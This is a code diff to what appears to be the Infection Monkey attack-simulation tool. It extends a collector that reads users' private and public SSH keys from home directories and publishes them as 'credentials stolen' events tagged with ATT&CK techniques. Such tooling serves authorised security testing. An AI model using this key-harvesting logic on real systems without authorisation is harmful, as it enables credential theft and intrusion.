@@ -1,8 +1,13 @@
 import glob
 import logging
 import os
+import time
+import uuid
 from typing import Dict, Iterable
 
+from common.credentials import Credentials, SSHKeypair, Username
+from common.event_queue import IEventQueue
+from common.events import CredentialsStolenEvent
 from common.utils.attack_utils import ScanStatus
 from infection_monkey.telemetry.attack.t1005_telem import T1005Telem
 from infection_monkey.telemetry.attack.t1145_telem import T1145Telem
@@ -12,9 +17,12 @@ from infection_monkey.utils.environment import is_windows_os
 logger = logging.getLogger(__name__)
 
 DEFAULT_DIRS = ["/.ssh/", "/"]
+SSH_CREDENTIAL_COLLECTOR_TAG = "SSHCredentialsStolen"
 
 
-def get_ssh_info(telemetry_messenger: ITelemetryMessenger) -> Iterable[Dict]:
+def get_ssh_info(
+    telemetry_messenger: ITelemetryMessenger, event_queue: IEventQueue
+) -> Iterable[Dict]:
     # TODO: Remove this check when this is turned into a plugin.
     if is_windows_os():
         logger.debug(
@@ -23,7 +31,7 @@ def get_ssh_info(telemetry_messenger: ITelemetryMessenger) -> Iterable[Dict]:
         return []
 
     home_dirs = _get_home_dirs()
-    ssh_info = _get_ssh_files(home_dirs, telemetry_messenger)
+    ssh_info = _get_ssh_files(home_dirs, telemetry_messenger, event_queue)
 
     return ssh_info
 
@@ -62,7 +70,7 @@ def _get_ssh_struct(name: str, home_dir: str) -> Dict:
 
 
 def _get_ssh_files(
-    usr_info: Iterable[Dict], telemetry_messenger: ITelemetryMessenger
+    usr_info: Iterable[Dict], telemetry_messenger: ITelemetryMessenger, event_queue: IEventQueue
 ) -> Iterable[Dict]:
     for info in usr_info:
         path = info["home_dir"]
@@ -101,6 +109,16 @@ def _get_ssh_files(
                                                     ScanStatus.USED, info["name"], info["home_dir"]
                                                 )
                                             )
+
+                                            collected_credentials = Credentials(
+                                                identity=Username(info["name"]),
+                                                secrets=SSHKeypair(
+                                                    info["private_key"], info["public_key"]
+                                                ),
+                                            )
+                                            _publish_credentials_stolen_event(
+                                                collected_credentials, event_queue
+                                            )
                                         else:
                                             continue
                                 except (IOError, OSError):
@@ -114,3 +132,15 @@ def _get_ssh_files(
                     pass
     usr_info = [info for info in usr_info if info["private_key"] or info["public_key"]]
     return usr_info
+
+
+def _publish_credentials_stolen_event(collected_credentials: Credentials, event_queue: IEventQueue):
+    credentials_stolen_event = CredentialsStolenEvent(
+        source=uuid.getnode(),
+        target=None,
+        timestamp=time.time(),
+        tags=frozenset({SSH_CREDENTIAL_COLLECTOR_TAG, "T1005", "T1145"}),
+        stolen_credentials=[collected_credentials],
+    )
+
+    event_queue.publish(credentials_stolen_event)
